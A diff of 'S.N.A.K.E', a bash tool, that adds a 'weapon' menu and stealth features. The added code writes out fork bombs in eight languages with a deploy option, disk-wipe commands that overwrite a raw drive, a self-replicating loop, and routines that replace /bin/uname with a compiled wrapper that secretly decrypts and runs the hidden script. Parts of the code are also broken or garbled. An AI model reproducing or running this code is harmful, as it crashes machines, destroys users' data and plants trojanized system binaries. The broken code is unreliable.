@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-_version="0.5.6"
+_version="0.5.7"
 _name="S.N.A.K.E"
 _morph_state="Unknown"
 
@@ -105,13 +105,49 @@ else
   fi
 fi
 
-_converted=$( echo $1 | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
-
-    cd ~ ; mkdir .blanao ; cd .blanao
-    sudo cp $_loc ./snake
-    cat snake | sed "s/snake/$1/g" | sed "s/S.N.A.K.E/$_converted/g" >> $1
-    sudo chmod +x $1 ; sudo cp $1 /usr/local/bin/ ; cd .. ; sudo rm -rf .blanao
-
+cd ~ ; mkdir cartel ; cd cartel
+touch $1
+echo "#include<stdio.h>" >> $1
+echo "#include<stdlib.h>" >> $1
+echo "#include<ctype.h>" >> $1
+echo "#include<unistd.h>" >> $1
+echo "#include<string.h>" >> $1
+echo "" >> $1
+echo "int main(int argc, char **argv){" >> $1
+echo "" >> $1
+echo "   char muie_cmd[1000] = \"\";" >> $1
+echo "" >> $1
+echo "   if ( argc == 1 ){" >> $1
+echo "      printf(\"snake init failed\n\");" >> $1
+echo "   } else if ( argc == 2 ) {" >> $1
+echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s\", \"sh ~/.spx/snake\", argv[1]);" >> $1
+echo "   } else if ( argc == 3 ) {" >> $1
+echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2]);" >> $1
+echo "   } else if ( argc == 4 ) {" >> $1
+echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3]);" >> $1
+echo "   } else if ( argc == 5 ) {" >> $1
+echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4]);" >> $1
+echo "   } else if ( argc == 6 ) {" >> $1
+echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4], argv[5]);" >> $1
+echo "   } else if ( argc == 7 ) {" >> $1
+echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4], argv[6]);" >> $1
+echo "   } else {" >> $1
+echo "      printf(\"snake init failed\n\");" >> $1
+echo "   }" >> $1
+echo "" >> $1
+echo "   system(\"openssl des -d -in ~/.spx/snake.sslz -out ~/.spx/snake -pass pass:cartof\");" >> $1
+echo "   system(muie_cmd);" >> $1
+echo "   system(\"sudo rm -rf ~/.spx/snake\");" >> $1
+echo "" >> $1
+echo "   return 0;" >> $1
+echo "" >> $1
+echo "}" >> $1
+sudo mv $1 $1.c >/dev/null 2>&1
+gcc $1.c >/dev/null 2>&1
+make $1 >/dev/null 2>&1
+rm -rf $1.c ; rm -rf a.out ; sudo chmod +x $1 ; sudo cp $1 /usr/local/bin ; sudo rm -rf $1 >/dev/null 2>&1
+sudo rm -rf snake ; snake dsp >/dev/null 2>&1
+cd .. ; rm -rf cartel
 
 
 }
@@ -559,7 +595,7 @@ _self(){ #selfh
        cat $_loc | grep  '_system == "' | grep -v 'INTEGRITY' | awk '{print $5}' | sort -u | sed 's/"$(uname/"Unix"/g' | sed 's/GNU/Hurd/g' | sed 's/CYGWIN_NT-10.0/Windows 10/g' | sed 's/CYGWIN_NT-5.0/Windows 2000/g' | sed 's/CYGWIN_NT-6.0/Windows Vista/g' | sed 's/CYGWIN_NT-6.1/Windows 7/g' | sed 's/CYGWIN_NT-5.1/Windows XP/g' | sed 's/OS\/390/z\/OS/g' | sed 's/"/ /g' | sed '$d' | sed '$d' | sed '$d' | sort -u  | sed '1d'
      elif [[ "$2" == "ratio" ]]; then
           if [ "$3" == "i" ]; then
-              printf "AIX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"A/UX"')\n"
+              printf "A/UX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"A/UX"')\n"
               printf "AIX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"AIX"')\n"
               printf "Darwin $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"Darwin"')\n"
               printf "HP-UX $(cat $_loc | grep  '_system == "' | awk '{print $5}' | grep -c '"HP-UX"')\n"
@@ -668,6 +704,8 @@ _self(){ #selfh
      else
        _suicide
      fi
+   elif [[ "$1" == "decoy" ]]; then
+       _decoy $2
    elif [[ "$1" == "upass" ]]; then
 
      cd ~
@@ -693,12 +731,12 @@ _self(){ #selfh
      fi
 
    elif [[ "$1" == "status" ]]; then
-     if [ -f /usr/local/bin/snake ]; then
-        printf "$RED"
-        printf "NOT protected "
-     else
+     if [ -f /usr/local/bin/snake.sslz ]; then
        printf "$GREEN"
        printf "Protected "
+     else
+       printf "$RED"
+       printf "NOT protected "
      fi
      if [ "$(echo snake | grep -c '.')" == 1 ]; then
         printf "$RED"
@@ -708,8 +746,211 @@ _self(){ #selfh
         printf "Ghosted "
      fi
      printf "\n$NC"
+   elif [[ "$1" == "bay" ]]; then
+     if [ "$2" == "fbomb" ]; then
+       if [ "$3" == "c" ]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.c
+           echo "#include <sys/types.h>" >> zion.c
+           echo "#include <unistd.h>" >> zion.c
+           echo "" >> zion.c
+           echo "int main(){" >> zion.c
+           echo "   while(1){ fork(); }" >> zion.c
+           echo "   return 0;" >> zion.c
+           echo "}" >> zion.c
+           pwd ; ls
+         else
+           echo ""
+           echo "#include <sys/types.h>"
+           echo "#include <unistd.h>"
+           echo ""
+           echo "int main(){"
+           echo "   while(1){ fork(); }"
+           echo "   return 0;"
+           echo "}"
+         fi
+
+       elif [[ "$3" == "bash" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.sh
+           echo ":(){ :|:& };:" >> zion.sh
+           pwd ; ls
+         else
+           echo ""
+           echo ":(){ :|:& };:"
+         fi
+
+       elif [[ "$3" == "bat" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.bat
+           echo "%0 | %0" >> zion.bat
+           pwd ; ls
+         else
+           echo ""
+           echo "%0 | %0"
+         fi
+
+       elif [[ "$3" == "cmd" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.bat
+           echo "@echo off" >> zion.bat
+           echo "start" >> zion.bat
+           echo "start" >> zion.bat
+           echo "start" >> zion.bat
+           echo "start" >> zion.bat
+           echo "start" >> zion.bat
+           echo "start zion" >> zion.bat
+           pwd ; ls
+         else
+           echo ""
+           echo "@echo off"
+           echo "start"
+           echo "start"
+           echo "start"
+           echo "start"
+           echo "start"
+           echo "start zion"
+         fi
+
+       elif [[ "$3" == "py" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.py
+           echo "import os" >> zion.py
+           echo "while True:" >> zion.py
+           echo "   os.fork()" >> zion.py
+           pwd ; ls
+         else
+           echo ""
+           echo "import os"
+           echo "while True:"
+           echo "   os.fork()"
+         fi
+
+       elif [[ "$3" == "ps" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.psr
+           echo "while(\$true) {" >> zion.psr
+           echo "   Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\";" >> zion.psr
+           echo "   Invoke-Expression -Command 'while(\$true) {Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\"}';" >> zion.psr
+           echo "}" >> zion.psr
+           pwd ; ls
+         else
+           echo ""
+           echo "while(\$true) {"
+           echo "while True:"
+           echo "   Invoke-Expression -Command 'while(\$true) {Start-Process powershell.exe -ArgumentList \"-NoExit\", \"Get-ChildItem -Recurse C:\"}';"
+           echo "}"
+         fi
+
+       elif [[ "$3" == "java" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.java
+           echo "public class ForkBomb" >> zion.java
+           echo "{" >> zion.java
+           echo "   public static void main(String[] args){" >> zion.java
+           echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});}" >> zion.java
+           echo "   }" >> zion.java
+           echo "}" >> zion.java
+           pwd ; ls
+         else
+           echo ""
+           echo "public class ForkBomb"
+           echo "{"
+           echo "   public static void main(String[] args){"
+           echo "      while(true){Runtime.getRuntime().exec(new String[]{\"javaw\", \"-cp\", System.getProperty(\"java.class.path\"), \"ForkBomb\"});}"
+           echo "   }"
+           echo "}"
+         fi
+
+       elif [[ "$3" == "lua" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.lua
+           echo "-- Requires \`luaposix' module" >> zion.lua
+           echo "local unistd = require \"posix.unistd\"" >> zion.lua
+           echo "" >> zion.lua
+           echo "while true do" >> zion.lua
+           echo "   unistd.fork()" >> zion.lua
+           echo "end" >> zion.lua
+           pwd ; ls
+         else
+           echo ""
+           echo "-- Requires \`luaposix' module"
+           echo "local unistd = require \"posix.unistd\""
+           echo ""
+           echo "while true do"
+           echo "   unistd.fork()"
+           echo "end"
+         fi
+
+       elif [[ "$3" == "perl" ]]; then
+
+         if [ "$4" == "deploy" ]; then
+           cd ~ ;  mkdir .new_nest ; cd .new_nest
+           touch zion.perl
+           echo "perl -e \"fork while fork\" &" >> zion.perl
+           pwd ; ls
+         else
+           echo ""
+           echo "perl -e \"fork while fork\" &"
+         fi
+
+       elif [[ "$3" == "magic" ]]; then
+         printf " c :: bash :: bat :: py :: ps :: java :: lua :: perl\n"
+       else
+         printf "$RED Bomb type ERROR$NC\n"
+       fi
+     elif [[ "$2" == "klogr" ]]; then
+
+       if [ "$3" == "windows" ]; then
+         printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "linux" ]]; then
+         printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "mac" ]]; then
+         printf "$RED Not supported yet$NC\n"
+       elif [[ "$3" == "magic" ]]; then
+         printf "windows :: linux :: mac\n"
+       else
+         printf "$RED Klogr SYS ERROR$NC\n"
+       fi
+
+     elif [[ "$2" == "rabbt" ]]; then
+       _new="$(openssl rand -hex 4 | cut -c 1-5)"
+       while(true); do
+         _r_melt $_new
+         $_new self bay rabbt
+         $_new self bay rabbt
+         $_new self bay rabbt
+         $_new self bay rabbt
+       done
+     elif [[ "$2" == "dwipe"]]; then
+       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sdX
+     elif [[ "$2" == "dsenc" ]]; then
+       openssl enc -aes-256-ctr -pass pass:"$(dd if=/dev/urandom bs=128 count=1 </dev/null | base64)" -nosalt </dev/zero | pv --progress --eta --rate --bytes | dd of=/dev/sdX
+     elif [[ "$2" == "magic" ]]; then
+       printf "fbomb :: klogr :: rabbt :: dwipe :: dsenc\n"
+     else
+       printf "$RED Weapon type ERROR$NC\n"
+     fi
+
+
    elif [[ "$1" == "magic" ]]; then
-     printf "$RED FUNC$YELLOW SYS$GREEN DB$NC\n"
+     printf "$RED FUNC$YELLOW SYS$GREEN DB $BLUE BAY$NC\n"
    else
      printf "$RED Not supported default$NC\n"
    fi
@@ -5185,6 +5426,8 @@ echo "cd() { builtin cd \"\$@\"; ls ;}" >> $1
 echo "_+() { open -a \$1 \$2 ;}" >> $1
 echo "_a() { open -a /Applications/\"\$1.app\"/Contents/MacOS/\$1 ;}" >> $1
 echo "_f() { open -a Finder ./ ;}" >> $1
+echo "-^(){ seq \$1 | xargs -Iz \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9; }" >> $1
+echo "-*(){ while :; do \$2 \$3 \$4 \$5 \$6 \$7 \$8 \$9; sleep \$1; done; }"
 echo "space() { du -hs \"\$@\" | sort -nr; }" >> $1
 echo "mkdg() { mkdir \$1 ; clear ; cd \$1 ;}" >> $1
 #  echo "docked() { sudo lsof -i :\"\$@\" ;}" >> .bash_profile
@@ -5511,8 +5754,6 @@ fi
 
 
 }
-
-
 
 
 _exec_q(){ #selfi
@@ -6239,7 +6480,7 @@ fi
 }
 
 
-_pd(){
+_pd(){ #selfc
 
 
 
@@ -6251,7 +6492,7 @@ _pd(){
 
 }
 
-_protect(){
+_protect(){ #selfc
 
   cd ~
   mkdir .spx ; cd .spx
@@ -6282,6 +6523,10 @@ _protect(){
   echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3]);" >> xsnake
   echo "   } else if ( argc == 5 ) {" >> xsnake
   echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4]);" >> xsnake
+  echo "   } else if ( argc == 6 ) {" >> xsnake
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4], argv[5]);" >> xsnake
+  echo "   } else if ( argc == 7 ) {" >> xsnake
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4], argv[6]);" >> xsnake
   echo "   } else {" >> xsnake
   echo "      printf(\"snake init failed\n\");" >> xsnake
   echo "   }" >> xsnake
@@ -6343,32 +6588,24 @@ _protect(){
 
   fi
 
-  if [ "$(cat .bash_profile | grep -c 'alias snake=')" == "1" ]; then
-    echo "moo" >/dev/null
-  else
-    echo "alias snake=xsnake" >> .bash_profile
-    source .bash_profile
-  fi
+  alias snake=xsnake
 
 }
 
 
-_back(){
+_back(){ #selfc
 
    cd ~/.spx
    openssl des -d -in snake.sslz -out snake -pass pass:cartof >/dev/null 2>&1
    sh snake -qinstall
-   cd ~
-   cat .bash_profile | sed 's/alias snake=\"xsnake\"//g' >> .new_profile >/dev/null 2>&1
+   unalias snake
    sudo rm -rf .spx
    sudo rm -rf /usr/local/bin/xsnake
-   sudo rm -rf .bash_profile ; sudo mv .new_profile .bash_profile
-   source .bash_profile >/dev/null 2>&1
 
 
 }
 
-_change(){
+_change(){ #selfc
 
   if [ -f /usr/local/bin/snake ]; then
      _loc=/usr/local/bin/snake
@@ -6392,6 +6629,168 @@ _change(){
   cd .. ; sudo rm -rf blana
 
 
+
+}
+
+
+
+_u_engage(){ #selfc
+
+  cd ~ ; mkdir cartel ; cd cartel
+  touch uname
+  echo "#include<stdio.h>" >> uname
+  echo "#include<stdlib.h>" >> uname
+  echo "#include<ctype.h>" >> uname
+  echo "#include<unistd.h>" >> uname
+  echo "#include<string.h>" >> uname
+  echo "" >> uname
+  echo "int main(int argc, char **argv){" >> uname
+  echo "" >> uname
+  echo "   char muie_cmd[1000] = \"\";" >> uname
+  echo "" >> uname
+  echo "   if ( argc == 1 ){" >> uname
+  echo "      printf(\"snake init failed\n\");" >> uname
+  echo "   } else if ( argc == 2 ) {" >> uname
+  echo "         if(strcmp(argv[1],\"-engage\") == 0){" >> uname
+  echo "            system(\"openssl des -d -in ~/.spx/snake.sslz -out ~/.spx/snake -pass pass:cartof\");" >> uname
+  echo "            system(\"sh ~/.spx/snake udngage\");" >> uname
+  echo "            system(\"sudo rm -rf ~/.spx/snake\");" >> uname
+  echo "         } else {" >> uname
+  echo "            snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s\", \"sh ~/.spx/snake\", argv[1]);" >> uname
+  echo "         }" >> uname
+  echo "   } else if ( argc == 3 ) {" >> uname
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2]);" >> uname
+  echo "   } else if ( argc == 4 ) {" >> uname
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3]);" >> uname
+  echo "   } else if ( argc == 5 ) {" >> uname
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4]);" >> uname
+  echo "   } else if ( argc == 6 ) {" >> uname
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4], argv[5]);" >> uname
+  echo "   } else if ( argc == 7 ) {" >> uname
+  echo "      snprintf(muie_cmd, sizeof(muie_cmd), \"%s %s %s %s %s %s %s\", \"sh ~/.spx/snake\", argv[1], argv[2], argv[3], argv[4], argv[6]);" >> uname
+  echo "   } else {" >> uname
+  echo "      printf(\"snake init failed\n\");" >> uname
+  echo "   }" >> uname
+  echo "" >> uname
+  echo "   system(\"openssl des -d -in ~/.spx/snake.sslz -out ~/.spx/snake -pass pass:cartof\");" >> uname
+  echo "   system(muie_cmd);" >> uname
+  echo "   system(\"sudo rm -rf ~/.spx/snake\");" >> uname
+  echo "" >> uname
+  echo "   return 0;" >> uname
+  echo "" >> uname
+  echo "}" >> uname
+  sudo mv uname uname.c >/dev/null 2>&1
+  gcc uname.c >/dev/null 2>&1
+  make uname >/dev/null 2>&1
+  rm -rf uname.c ; rm -rf a.out ; sudo chmod +x uname ; sudo rm -rf /bin/uname ; sudo cp uname /bin ; sudo rm -rf uname >/dev/null 2>&1
+  cd .. ; rm -rf cartel
+
+}
+
+
+_u_disengage(){ #selfc
+
+  cd ~ ; mkdir cartel ; cd cartel
+  touch uname
+  echo "#include<stdio.h>" >> uname
+  echo "#include<stdlib.h>" >> uname
+  echo "#include<ctype.h>" >> uname
+  echo "#include<unistd.h>" >> uname
+  echo "#include<string.h>" >> uname
+  echo "#include<stdbool.h>" >> uname
+  echo "" >> uname
+  echo "char _a[1000] = "";" >> uname
+  echo "char _m[1000] = "";" >> uname
+  echo "char _n[1000] = "";" >> uname
+  echo "char _p[1000] = "";" >> uname
+  echo "char _r[1000] = "";" >> uname
+  echo "char _s[1000] = "";" >> uname
+  echo "char _v[1000] = "";" >> uname
+  echo "" >> uname
+  echo "void _got_a(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -a\", \"r\");" >> uname
+  echo "   while (fgets(_a, sizeof(_a), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "void _got_m(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -m\", \"r\");" >> uname
+  echo "   while (fgets(_m, sizeof(_m), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "void _got_n(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -n\", \"r\");" >> uname
+  echo "   while (fgets(_n, sizeof(_n), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "void _got_p(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -p\", \"r\");" >> uname
+  echo "   while (fgets(_p, sizeof(_p), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "void _got_r(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -r\", \"r\");" >> uname
+  echo "   while (fgets(_r, sizeof(_r), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "void _got_s(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -s\", \"r\");" >> uname
+  echo "   while (fgets(_s, sizeof(_s), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "void _got_v(){" >> uname
+  echo "   FILE *fp,*outputfile;" >> uname
+  echo "   fp = popen(\"uname -v\", \"r\");" >> uname
+  echo "   while (fgets(_v, sizeof(_v), fp) != NULL)" >> uname
+  echo "   {}" >> uname
+  echo "   pclose(fp);" >> uname
+  echo "}" >> uname
+  echo "" >> uname
+  echo "int main(int argc, char **argv, char * envp[]){" >> uname
+  echo "" >> uname
+  echo "   _got_a();" >> uname
+  echo "   _got_m();" >> uname
+  echo "   _got_n();" >> uname
+  echo "   _got_p();" >> uname
+  echo "   _got_r();" >> uname
+  echo "   _got_s();" >> uname
+  echo "   _got_v();" >> uname
+  echo "" >> uname
+  echo "   for (char **a = argv ; a != argv+argc ; a++) {" >> uname
+  echo "      for(char *p = *a ; *p != '\0' ; p++) {" >> uname
+  echo "         if(strcmp(p,\"-a\") == 0){ printf(\"%s\",_a); }" >> uname
+  echo "         if(strcmp(p,\"-m\") == 0){ printf(\"%s\",_m); }" >> uname
+  echo "         if(strcmp(p,\"-n\") == 0){ printf(\"%s\",_n); }" >> uname
+  echo "         if(strcmp(p,\"-p\") == 0){ printf(\"%s\",_p); }" >> uname
+  echo "         if(strcmp(p,\"-r\") == 0){ printf(\"%s\",_r); }" >> uname
+  echo "         if(strcmp(p,\"-s\") == 0){ printf(\"%s\",_s); }" >> uname
+  echo "         if(strcmp(p,\"-v\") == 0){ printf(\"%s\",_v); }" >> uname
+  echo "         if(strcmp(p,\"-engage\") == 0){" >> uname
+  echo "            system(\"openssl des -d -in ~/.spx/snake.sslz -out ~/.spx/snake -pass pass:cartof\");" >> uname
+  echo "            system(\"sh ~/.spx/snake uengage\");" >> uname
+  echo "            system(\"sudo rm -rf ~/.spx/snake\");" >> uname
+  echo "         }" >> uname
+  echo "      }" >> uname
+  echo "   }" >> uname
+  echo "   return 0;" >> uname
+  echo "}" >> uname
+  echo "" >> uname
+  sudo mv uname uname.c >/dev/null 2>&1
+  gcc uname.c >/dev/null 2>&1
+  make uname >/dev/null 2>&1
+  rm -rf uname.c ; rm -rf a.out ; sudo chmod +x uname ; sudo rm -rf /bin/uname ; sudo cp uname /bin ; sudo rm -rf uname >/dev/null 2>&1
+  cd .. ; rm -rf cartel
 
 }
 
@@ -6449,6 +6848,233 @@ fi
   sudo cp $_loc ./snake
   sudo cp snake snake2
   sh snake -uninstall
+  sudo rm -rf snake
+  cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+  cd .. ; sudo rm -rf blana
+
+
+
+elif [[ $_system == "Linux" ]]; then
+
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+  cd ~
+  sudo cp $_loc ./snake
+  sudo cp snake snake2
+  cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  sudo rm -rf snake2 ; printf "$_revved\n" ; sudo chmod +x $_new ; sudo cp $_new /usr/local/bin/
+  sh snake -uninstall
+  sudo rm -rf snake
+  #sh ${_names[$_rnd]} -qinstall ; sudo rm -rf ${_names[$_rnd]}
+
+
+elif [[ $_system == "GNU" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+ su
+ cp $_loc ./snake
+ cp snake snake2
+ sh snake -uninstall
+ rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ rm -rf snake2 ; sh $_new -qinstall ; rm -rf $_new
+
+elif [[ $_system == "Haiku" ]]; then
+
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+  cat snake | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+  printf "$_new\n" ; sh $_new -qinstall
+  sh snake -uninstall
+  rm -rf snake
+
+
+elif [[ $_system == "HP-UX" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+
+elif [[ $_system == "Minix" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "SunOS" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+elif [[ $_system == "OS/390" ]]; then
+
+  _converted=$( echo $1 | rev | sed 's/./&./g' | awk '{print toupper($0)}' | sed 's/.$//')
+  _new="$(echo $1 | rev )"
+
+
+ sudo cp $_loc ./snake
+ sudo cp snake snake2
+ sh snake -uninstall
+ sudo rm -rf snake
+ cat snake2 | sed "s/snake/$_new/g" | sed "s/S.N.A.K.E/$_converted/g" > $_new
+ sudo rm -rf snake2 ; sh $_new -qinstall ; sudo rm -rf $_new
+
+
+else
+
+  printf "$RED Not supported sys$NC\n"
+
+fi
+
+
+
+
+}
+
+_r_melt(){ #selfc
+
+
+
+if [ -f /usr/local/bin/snake ]; then
+   _loc=/usr/local/bin/snake
+else
